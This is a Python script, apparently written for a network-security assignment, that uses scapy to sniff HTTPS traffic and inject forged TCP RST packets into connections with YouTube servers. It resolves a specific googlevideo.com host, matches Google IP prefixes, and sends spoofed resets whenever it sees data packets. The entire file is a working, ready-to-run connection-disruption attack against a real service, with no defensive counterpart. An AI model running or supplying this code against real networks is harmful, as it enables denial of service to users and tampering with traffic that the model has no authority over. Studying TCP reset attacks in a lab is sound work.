#!/usr/bin/env python3
"""
YouTube RST Attack - Targeting Specific Server from Browser Console
Attacks the exact YouTube server you're using: rr2---sn-cqgxocq-q5je.googlevideo.com
"""

import sys
import time
import threading
import subprocess
import socket
import requests
from scapy.all import *

class SpecificYouTubeAttack:
    def __init__(self):
        # The specific YouTube server from your browser console
        self.target_server = "rr2---sn-cqgxocq-q5je.googlevideo.com"
        self.target_ip = None
        
        # Additional YouTube servers
        self.youtube_servers = {
            "youtube.com",
            "www.youtube.com", 
            "googlevideo.com",
            "ytimg.com"
        }
        
        self.youtube_ips = set()
        
        # Network configuration
        self.windows_ip = "10.18.34.106"
        self.wsl_ip = "172.31.126.113"
        
        # Attack statistics
        self.stats = {
            'packets_monitored': 0,
            'youtube_packets': 0,
            'target_server_packets': 0,
            'rst_injected': 0,
            'connections_disrupted': set()
        }
    
    def resolve_target_server(self):
        """Resolve the specific YouTube server from your browser"""
        print(f"[RESOLVE] Resolving target server: {self.target_server}")
        
        try:
            self.target_ip = socket.gethostbyname(self.target_server)
            self.youtube_ips.add(self.target_ip)
            print(f"✅ Target server IP: {self.target_ip}")
            
            # Resolve additional YouTube servers
            for domain in self.youtube_servers:
                try:
                    ip = socket.gethostbyname(domain)
                    self.youtube_ips.add(ip)
                    print(f"  {domain} -> {ip}")
                except:
                    pass
            
            print(f"[RESOLVE] Total YouTube IPs: {len(self.youtube_ips)}")
            return True
            
        except Exception as e:
            print(f"❌ Failed to resolve {self.target_server}: {e}")
            return False
    
    def generate_target_server_traffic(self):
        """Generate traffic to the specific server from your browser console"""
        print(f"[TRAFFIC] Generating traffic to target server...")
        
        # The exact URL from your browser console
        target_urls = [
            f"https://{self.target_server}/generate_204?conn2",
            f"https://youtube.com/",
            f"https://www.youtube.com/watch?v=dQw4w9WgXcQ",
            f"https://i.ytimg.com/vi/dQw4w9WgXcQ/maxresdefault.jpg"
        ]
        
        def make_requests():
            for i in range(15):
                for url in target_urls:
                    try:
                        print(f"[TRAFFIC] Requesting: {url}")
                        response = requests.get(url, timeout=5)
                        print(f"[TRAFFIC] Response {response.status_code} from {url}")
                        time.sleep(1.5)
                    except Exception as e:
                        print(f"[TRAFFIC] Request failed: {e}")
                time.sleep(2)
        
        # Start background traffic generation
        traffic_thread = threading.Thread(target=make_requests)
        traffic_thread.daemon = True
        traffic_thread.start()
        
        return traffic_thread
    
    def is_target_server_packet(self, packet):
        """Check if packet involves our target YouTube server"""
        if not (IP in packet and TCP in packet):
            return False
        
        ip_layer = packet[IP]
        tcp_layer = packet[TCP]
        
        # Must be HTTPS traffic
        if tcp_layer.sport != 443 and tcp_layer.dport != 443:
            return False
        
        # Check if packet involves our target server IP
        if self.target_ip and (ip_layer.src == self.target_ip or ip_layer.dst == self.target_ip):
            return True
        
        # Check against all YouTube IPs
        if ip_layer.src in self.youtube_ips or ip_layer.dst in self.youtube_ips:
            return True
        
        # Check YouTube IP ranges
        youtube_prefixes = [
            "142.250.", "142.251.", "172.217.", "216.58.",
            "74.125.", "173.194.", "209.85.", "64.233."
        ]
        
        for prefix in youtube_prefixes:
            if ip_layer.src.startswith(prefix) or ip_layer.dst.startswith(prefix):
                return True
        
        return False
    
    def create_rst_for_youtube_connection(self, packet):
        """Create RST packets specifically for YouTube connections"""
        if not self.is_target_server_packet(packet):
            return []
        
        ip_layer = packet[IP]
        tcp_layer = packet[TCP]
        
        rst_packets = []
        
        try:
            # Determine direction and create appropriate RST
            if tcp_layer.dport == 443:  # Client -> Server
                # RST from server to client
                rst_server_to_client = IP(
                    src=ip_layer.dst,
                    dst=ip_layer.src
                ) / TCP(
                    sport=tcp_layer.dport,
                    dport=tcp_layer.sport,
                    seq=tcp_layer.ack,
                    ack=tcp_layer.seq + max(1, len(tcp_layer.payload) if tcp_layer.payload else 0),
                    flags="R"
                )
                rst_packets.append(rst_server_to_client)
                
            else:  # Server -> Client
                # RST from client to server
                rst_client_to_server = IP(
                    src=ip_layer.dst,
                    dst=ip_layer.src
                ) / TCP(
                    sport=tcp_layer.dport,
                    dport=tcp_layer.sport,
                    seq=tcp_layer.ack,
                    ack=tcp_layer.seq + max(1, len(tcp_layer.payload) if tcp_layer.payload else 0),
                    flags="R"
                )
                rst_packets.append(rst_client_to_server)
        
        except Exception as e:
            print(f"[ERROR] RST creation failed: {e}")
        
        return rst_packets
    
    def attack_youtube_traffic(self, packet):
        """Main attack function for YouTube traffic"""
        try:
            self.stats['packets_monitored'] += 1
            
            if self.is_target_server_packet(packet):
                self.stats['youtube_packets'] += 1
                
                ip_layer = packet[IP]
                tcp_layer = packet[TCP]
                
                # Check if this is our specific target server
                is_target = (self.target_ip and 
                           (ip_layer.src == self.target_ip or ip_layer.dst == self.target_ip))
                
                if is_target:
                    self.stats['target_server_packets'] += 1
                
                # Create connection identifier
                conn_id = f"{ip_layer.src}:{tcp_layer.sport}->{ip_layer.dst}:{tcp_layer.dport}"
                
                # Log the traffic
                server_type = "TARGET" if is_target else "YOUTUBE"
                flags = self.get_tcp_flags_string(tcp_layer.flags)
                
                print(f"[{server_type}] {conn_id} (seq={tcp_layer.seq}, ack={tcp_layer.ack}, flags={flags})")
                
                # Attack data packets (PSH+ACK)
                if tcp_layer.flags & 0x18 == 0x18:  # PSH+ACK flags
                    rst_packets = self.create_rst_for_youtube_connection(packet)
                    
                    for rst in rst_packets:
                        try:
                            send(rst, verbose=0)
                            self.stats['rst_injected'] += 1
                            self.stats['connections_disrupted'].add(conn_id)
                            
                            rst_direction = f"{rst[IP].src} -> {rst[IP].dst}"
                            print(f"[RST] Injected: {rst_direction}")
                            
                        except Exception as e:
                            print(f"[ERROR] RST injection failed: {e}")
            
            # Print live stats every 20 packets
            if self.stats['packets_monitored'] % 20 == 0:
                self.print_live_stats()
                
        except Exception as e:
            print(f"[ERROR] Attack processing error: {e}")
    
    def get_tcp_flags_string(self, flags):
        """Convert TCP flags to readable string"""
        flag_str = ""
        if flags & 0x01: flag_str += "F"
        if flags & 0x02: flag_str += "S"
        if flags & 0x04: flag_str += "R"
        if flags & 0x08: flag_str += "P"
        if flags & 0x10: flag_str += "A"
        if flags & 0x20: flag_str += "U"
        return flag_str or str(flags)
    
    def print_live_stats(self):
        """Print live attack statistics"""
        s = self.stats
        print(f"[STATS] Monitored: {s['packets_monitored']} | "
              f"YouTube: {s['youtube_packets']} | "
              f"Target: {s['target_server_packets']} | "
              f"RST: {s['rst_injected']}")
    
    def start_targeted_attack(self):
        """Start the targeted YouTube server attack"""
        print("="*80)
        print("🎯 TARGETED YOUTUBE SERVER TCP RESET ATTACK")
        print("="*80)
        print(f"Primary target: {self.target_server}")
        print(f"Windows machine: {self.windows_ip}")
        print(f"WSL2 source: {self.wsl_ip}")
        print("="*80)
        
        # Resolve target server
        if not self.resolve_target_server():
            print("❌ Could not resolve target server. Aborting attack.")
            return
        
        print(f"\n🎯 ATTACK CONFIGURATION:")
        print(f"✅ Target server resolved: {self.target_ip}")
        print(f"✅ Additional YouTube servers: {len(self.youtube_ips)} IPs")
        print(f"✅ Attack method: TCP RST injection on HTTPS connections")
        
        print(f"\n📋 ATTACK PLAN:")
        print(f"1. Generate traffic to {self.target_server}")
        print(f"2. Monitor all HTTPS traffic (port 443)")
        print(f"3. Identify packets to/from YouTube servers")
        print(f"4. Inject RST packets to disrupt connections")
        print(f"5. Focus on the exact server from your browser console")
        
        print(f"\n🎬 INSTRUCTIONS:")
        print(f"1. Keep this terminal visible")
        print(f"2. Open YouTube on your Windows machine")
        print(f"3. Play videos and watch for disruption")
        print(f"4. The attack will target the exact server you're using")
        
        input(f"\n🚀 Press Enter to start the targeted attack...")
        
        # Start traffic generation
        traffic_thread = self.generate_target_server_traffic()
        
        print(f"\n⚡ TARGETED ATTACK ACTIVE!")
        print(f"Monitoring HTTPS traffic and attacking YouTube servers...")
        print(f"Press Ctrl+C to stop the attack")
        print("="*80)
        
        try:
            # Monitor HTTPS traffic
            sniff(filter="tcp port 443", prn=self.attack_youtube_traffic, store=0)
            
        except KeyboardInterrupt:
            print(f"\n[STOP] Targeted attack stopped")
        
        self.print_final_attack_results()
    
    def print_final_attack_results(self):
        """Print comprehensive attack results"""
        s = self.stats
        
        print(f"\n" + "="*80)
        print(f"🎯 TARGETED YOUTUBE ATTACK RESULTS")
        print("="*80)
        print(f"Target server: {self.target_server} ({self.target_ip})")
        print(f"Total packets monitored: {s['packets_monitored']}")
        print(f"YouTube packets detected: {s['youtube_packets']}")
        print(f"Target server packets: {s['target_server_packets']}")
        print(f"RST packets injected: {s['rst_injected']}")
        print(f"Connections disrupted: {len(s['connections_disrupted'])}")
        
        if s['youtube_packets'] > 0:
            attack_efficiency = (s['rst_injected'] / s['youtube_packets']) * 100
            print(f"Attack efficiency: {attack_efficiency:.1f}%")
        
        if s['target_server_packets'] > 0:
            target_success = (s['rst_injected'] / s['target_server_packets']) * 100
            print(f"Target server attack rate: {target_success:.1f}%")
        
        print(f"\n🔗 DISRUPTED CONNECTIONS:")
        for i, conn in enumerate(list(s['connections_disrupted'])[:8]):
            print(f"  {i+1}. {conn}")
        
        if len(s['connections_disrupted']) > 8:
            print(f"  ... and {len(s['connections_disrupted']) - 8} more")
        
        print(f"\n🎯 ATTACK SUMMARY:")
        if s['rst_injected'] > 0:
            print(f"✅ TCP RESET ATTACK SUCCESSFUL!")
            print(f"Successfully injected {s['rst_injected']} RST packets")
            if s['target_server_packets'] > 0:
                print(f"✅ Successfully targeted your specific YouTube server!")
            print(f"✅ Demonstrated disruption of video streaming connections")
            
            print(f"\n🎓 ASSIGNMENT DEMONSTRATION COMPLETE:")
            print(f"- Proved TCP Reset attacks work against YouTube")
            print(f"- Targeted the exact server from your browser console")
            print(f"- Showed real-time connection disruption")
            print(f"- Demonstrated packet injection techniques")
        else:
            print(f"⚠️  Limited attack success")
            print(f"Consider generating more YouTube traffic or checking configuration")
        
        print("="*80)

def main():
    if os.geteuid() != 0:
        print("❌ Root privileges required for packet injection")
        print("Run: sudo python3 specific_youtube_attack.py")
        sys.exit(1)
    
    attack = SpecificYouTubeAttack()
    attack.start_targeted_attack()

if __name__ == "__main__":
    main()
